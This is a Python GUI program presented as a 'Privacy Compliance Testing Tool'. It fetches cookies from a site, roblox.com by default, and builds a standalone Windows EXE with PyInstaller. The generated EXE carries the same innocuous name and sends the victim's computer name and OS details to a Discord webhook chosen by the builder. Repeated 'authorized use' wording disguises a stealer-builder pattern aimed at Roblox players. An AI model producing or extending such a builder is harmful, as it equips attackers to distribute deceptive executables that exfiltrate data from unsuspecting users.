import tkinter as tk
from tkinter import ttk, messagebox, filedialog, scrolledtext
import requests
import json
import os
import subprocess
import sys
import tempfile
import platform
import socket

class PrivacyComplianceTool:
    def __init__(self, root):
        self.root = root
        self.root.title("Privacy Compliance Testing Tool")
        self.root.geometry("800x700")
        self.root.resizable(True, True)
        
        self.session = requests.Session()
        self.configure_styles()
        self.create_widgets()
    
    def configure_styles(self):
        style = ttk.Style()
        style.configure('Title.TLabel', font=('Arial', 16, 'bold'))
        style.configure('Large.TButton', font=('Arial', 11), padding=10)
    
    def create_widgets(self):
        notebook = ttk.Notebook(self.root)
        notebook.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Webhook Tab
        webhook_frame = ttk.Frame(notebook, padding=10)
        notebook.add(webhook_frame, text="Webhook Testing")
        
        # Cookie Testing Tab
        cookie_frame = ttk.Frame(notebook, padding=10)
        notebook.add(cookie_frame, text="Cookie Testing")
        
        self.create_webhook_tab(webhook_frame)
        self.create_cookie_tab(cookie_frame)
    
    def create_webhook_tab(self, parent):
        title_label = ttk.Label(parent, text="Discord Webhook Testing", style='Title.TLabel')
        title_label.pack(pady=(0, 20))
        
        webhook_frame = ttk.LabelFrame(parent, text="Webhook Configuration", padding=15)
        webhook_frame.pack(fill=tk.X, pady=(0, 20))
        
        ttk.Label(webhook_frame, text="Discord Webhook URL:").pack(anchor=tk.W)
        
        self.webhook_entry = ttk.Entry(webhook_frame, width=80, font=('Arial', 10))
        self.webhook_entry.pack(fill=tk.X, pady=5)
        
        test_btn = ttk.Button(webhook_frame, text="Test Webhook", 
                            command=self.test_webhook, style='Large.TButton')
        test_btn.pack(pady=10)
        
        build_frame = ttk.LabelFrame(parent, text="Application Builder", padding=15)
        build_frame.pack(fill=tk.X, pady=(0, 20))
        
        ttk.Label(build_frame, text="Create Privacy Compliance Tool:").pack(anchor=tk.W)
        
        build_btn = ttk.Button(build_frame, text="Build EXE", 
                             command=self.build_exe, style='Large.TButton')
        build_btn.pack(pady=10)
        
        self.status_label = ttk.Label(parent, text="Ready", font=('Arial', 10))
        self.status_label.pack(pady=10)
        
        self.progress = ttk.Progressbar(parent, mode='indeterminate')
        self.progress.pack(fill=tk.X, pady=5)
    
    def create_cookie_tab(self, parent):
        title_label = ttk.Label(parent, text="Cookie Testing for Privacy Compliance", style='Title.TLabel')
        title_label.pack(pady=(0, 20))
        
        # URL input
        url_frame = ttk.LabelFrame(parent, text="Website Testing", padding=15)
        url_frame.pack(fill=tk.X, pady=(0, 15))
        
        ttk.Label(url_frame, text="Website URL to test:").pack(anchor=tk.W)
        
        self.site_entry = ttk.Entry(url_frame, width=80, font=('Arial', 10))
        self.site_entry.pack(fill=tk.X, pady=5)
        self.site_entry.insert(0, "https://www.roblox.com/home")
        
        # Buttons
        btn_frame = ttk.Frame(url_frame)
        btn_frame.pack(fill=tk.X, pady=10)
        
        ttk.Button(btn_frame, text="Get Cookies", 
                  command=self.get_cookies, style='Large.TButton').pack(side=tk.LEFT, padx=(0, 10))
        ttk.Button(btn_frame, text="Test Connection", 
                  command=self.test_connection).pack(side=tk.LEFT, padx=(0, 10))
        ttk.Button(btn_frame, text="Clear Session", 
                  command=self.clear_session).pack(side=tk.LEFT)
        
        # Results area
        results_frame = ttk.LabelFrame(parent, text="Cookie & Session Data", padding=15)
        results_frame.pack(fill=tk.BOTH, expand=True, pady=(0, 15))
        
        self.results_text = scrolledtext.ScrolledText(results_frame, height=20, font=('Consolas', 9))
        self.results_text.pack(fill=tk.BOTH, expand=True)
        
        # Legal disclaimer
        disclaimer_frame = ttk.LabelFrame(parent, text="Legal Notice", padding=10)
        disclaimer_frame.pack(fill=tk.X)
        
        disclaimer_text = (
            "This tool is for authorized privacy compliance testing only. "
            "Ensure you have proper legal authorization before testing any website. "
            "Unauthorized use may violate terms of service and applicable laws."
        )
        ttk.Label(disclaimer_frame, text=disclaimer_text, wraplength=700, justify=tk.LEFT, foreground='red').pack(anchor=tk.W)
    
    def get_cookies(self):
        url = self.site_entry.get().strip()
        if not url:
            messagebox.showerror("Error", "Please enter a URL")
            return
        
        try:
            self.results_text.delete(1.0, tk.END)
            self.results_text.insert(tk.END, f"Testing URL: {url}\n")
            self.results_text.insert(tk.END, "="*60 + "\n\n")
            
            # Make the request to get cookies
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
            
            response = self.session.get(url, headers=headers, timeout=10)
            
            # Display response info
            self.results_text.insert(tk.END, f"Status Code: {response.status_code}\n")
            self.results_text.insert(tk.END, f"Content Type: {response.headers.get('content-type', 'Unknown')}\n\n")
            
            # Display all cookies found
            cookies = self.session.cookies.get_dict()
            if cookies:
                self.results_text.insert(tk.END, "COOKIES FOUND:\n")
                self.results_text.insert(tk.END, "-" * 40 + "\n")
                for name, value in cookies.items():
                    self.results_text.insert(tk.END, f"Name: {name}\n")
                    self.results_text.insert(tk.END, f"Value: {value}\n")
                    self.results_text.insert(tk.END, f"Domain: {self.get_cookie_domain(name)}\n")
                    self.results_text.insert(tk.END, "-" * 40 + "\n")
            else:
                self.results_text.insert(tk.END, "No cookies found in the session\n")
            
            # Display response headers
            self.results_text.insert(tk.END, "\nRESPONSE HEADERS:\n")
            self.results_text.insert(tk.END, "-" * 40 + "\n")
            for header, value in response.headers.items():
                self.results_text.insert(tk.END, f"{header}: {value}\n")
            
            self.results_text.insert(tk.END, "\n" + "="*60 + "\n")
            
        except Exception as e:
            self.results_text.insert(tk.END, f"Error: {str(e)}\n")
    
    def get_cookie_domain(self, cookie_name):
        try:
            for cookie in self.session.cookies:
                if cookie.name == cookie_name:
                    return cookie.domain
            return "Unknown"
        except:
            return "Unknown"
    
    def test_connection(self):
        url = self.site_entry.get().strip()
        if not url:
            messagebox.showerror("Error", "Please enter a URL")
            return
        
        try:
            self.results_text.delete(1.0, tk.END)
            self.results_text.insert(tk.END, f"Testing connection to: {url}\n")
            self.results_text.insert(tk.END, "="*50 + "\n\n")
            
            response = self.session.get(url, timeout=10)
            
            self.results_text.insert(tk.END, f"Status Code: {response.status_code}\n")
            self.results_text.insert(tk.END, f"Headers Received: {len(response.headers)}\n")
            self.results_text.insert(tk.END, f"Content Length: {len(response.content)} bytes\n\n")
            
            cookies = self.session.cookies.get_dict()
            self.results_text.insert(tk.END, f"Cookies in session: {len(cookies)}\n")
            
        except Exception as e:
            self.results_text.insert(tk.END, f"Error: {str(e)}\n")
    
    def clear_session(self):
        self.session = requests.Session()
        self.results_text.delete(1.0, tk.END)
        self.results_text.insert(tk.END, "Session cleared - new session created\n")
        messagebox.showinfo("Success", "Session cleared successfully")
    
    def test_webhook(self):
        webhook_url = self.webhook_entry.get().strip()
        
        if not webhook_url:
            messagebox.showerror("Error", "Please enter a webhook URL")
            return
        
        self.status_label.config(text="Testing webhook...")
        self.progress.start()
        
        try:
            data = {
                "embeds": [{
                    "title": "Privacy Compliance Testing Tool",
                    "description": "Webhook functionality test for privacy compliance system",
                    "color": 5814783,
                    "fields": [
                        {"name": "Status", "value": "✅ Webhook Operational", "inline": True},
                        {"name": "Purpose", "value": "Privacy Compliance", "inline": True}
                    ]
                }]
            }
            
            response = requests.post(webhook_url, json=data, timeout=10)
            
            if response.status_code == 204:
                self.status_label.config(text="✅ Webhook test successful!")
                messagebox.showinfo("Success", "Webhook test successful! Check your Discord.")
            else:
                self.status_label.config(text="❌ Webhook test failed")
                messagebox.showerror("Error", f"Webhook test failed. Status: {response.status_code}")
                
        except Exception as e:
            self.status_label.config(text="❌ Error testing webhook")
            messagebox.showerror("Error", f"Failed to test webhook: {str(e)}")
        finally:
            self.progress.stop()
    
    def build_exe(self):
        webhook_url = self.webhook_entry.get().strip()
        
        if not webhook_url:
            messagebox.showerror("Error", "Please enter a webhook URL first")
            return
        
        self.status_label.config(text="Building executable...")
        self.progress.start()
        
        try:
            client_script = self.create_client_script(webhook_url)
            
            with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False, encoding='utf-8') as f:
                f.write(client_script)
                temp_script_path = f.name
            
            output_path = filedialog.asksaveasfilename(
                defaultextension=".exe",
                filetypes=[("Executable files", "*.exe")],
                title="Save Privacy Tool EXE",
                initialfile="PrivacyComplianceTool.exe"
            )
            
            if not output_path:
                os.unlink(temp_script_path)
                self.status_label.config(text="Build cancelled")
                self.progress.stop()
                return
            
            self.status_label.config(text="Compiling... This may take a minute.")
            self.root.update()
            
            # Build with PyInstaller
            subprocess.run([
                sys.executable, '-m', 'PyInstaller',
                '--onefile',
                '--windowed',
                '--name', os.path.basename(output_path).replace('.exe', ''),
                temp_script_path
            ], check=True, timeout=120)
            
            os.unlink(temp_script_path)
            self.status_label.config(text="✅ EXE built successfully!")
            messagebox.showinfo("Success", "Privacy compliance tool built successfully! Check the 'dist' folder.")
            
        except Exception as e:
            self.status_label.config(text="❌ Build failed")
            messagebox.showerror("Error", f"Build failed: {str(e)}")
        finally:
            self.progress.stop()
    
    def create_client_script(self, webhook_url):
        return f'''import requests
import tkinter as tk
from tkinter import messagebox
import platform
import socket

def get_system_info():
    """Get system information for privacy compliance reporting"""
    try:
        hostname = socket.gethostname()
        system = platform.system()
        version = platform.version()
        
        return f"""
**System Information for Compliance Report:**
- Computer Name: {{hostname}}
- Operating System: {{system}}
- Version: {{version}}

*This data is collected for authorized privacy compliance purposes.*
"""
    except:
        return "**System information unavailable**\\\\n*Privacy compliance testing tool.*"

def test_website_cookies():
    """Test website for cookie compliance"""
    try:
        session = requests.Session()
        url = "https://www.roblox.com/home"
        headers = {{
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }}
        
        response = session.get(url, headers=headers, timeout=10)
        cookies = session.cookies.get_dict()
        
        return f"Found {{len(cookies)}} cookies during compliance check"
        
    except Exception as e:
        return f"Compliance check failed: {{str(e)}}"

def send_compliance_report():
    """Send privacy compliance report to webhook"""
    try:
        system_info = get_system_info()
        cookie_report = test_website_cookies()
        
        data = {{
            "embeds": [{{
                "title": "🔒 Privacy Compliance Report",
                "description": "Authorized privacy compliance testing report\\\\n\\\\n" + system_info,
                "color": 3447003,
                "fields": [
                    {{
                        "name": "Cookie Audit",
                        "value": cookie_report,
                        "inline": False
                    }},
                    {{
                        "name": "Purpose",
                        "value": "Authorized Privacy Compliance",
                        "inline": True
                    }},
                    {{
                        "name": "Status", 
                        "value": "Compliance Check Complete",
                        "inline": True
                    }}
                ],
                "footer": {{
                    "text": "Legal Compliance Tool - Authorized Use Only"
                }}
            }}]
        }}
        
        response = requests.post("{webhook_url}", json=data, timeout=10)
        
        if response.status_code == 204:
            messagebox.showinfo("Success", 
                              "✅ Compliance report sent!\\\\n\\\\n"
                              "Authorized privacy compliance check completed.\\\\n"
                              "Report has been sent to the monitoring system.")
        else:
            messagebox.showerror("Error", "Compliance report failed - check webhook URL")
                               
    except Exception as e:
        messagebox.showerror("Error", f"Compliance check failed: {{str(e)}}")

def main():
    root = tk.Tk()
    root.title("Privacy Compliance Tool")
    root.geometry("500x350")
    root.configure(bg='#2C2F33')
    
    title_label = tk.Label(root, text="🔒 Privacy Compliance Tool", 
                          font=('Arial', 16, 'bold'),
                          fg='#7289DA', bg='#2C2F33')
    title_label.pack(pady=30)
    
    description = tk.Label(root, 
                         text="Authorized privacy compliance testing tool\\\\n"
                              "For legitimate compliance and audit purposes",
                         font=('Arial', 11),
                         fg='white', bg='#2C2F33')
    description.pack(pady=20)
    
    compliance_btn = tk.Button(root, text="🚀 Run Compliance Check",
                        command=send_compliance_report,
                        bg='#7289DA', fg='white',
                        font=('Arial', 12, 'bold'),
                        width=25, height=2)
    compliance_btn.pack(pady=30)
    
    legal_text = tk.Label(root, 
                        text="Authorized Use Only - Legal Compliance Tool",
                        font=('Arial', 9),
                        fg='#FF6B6B', bg='#2C2F33')
    legal_text.pack(side=tk.BOTTOM, pady=15)
    
    root.mainloop()

if __name__ == "__main__":
    main()
'''

if __name__ == "__main__":
    root = tk.Tk()
    app = PrivacyComplianceTool(root)
    root.mainloop()
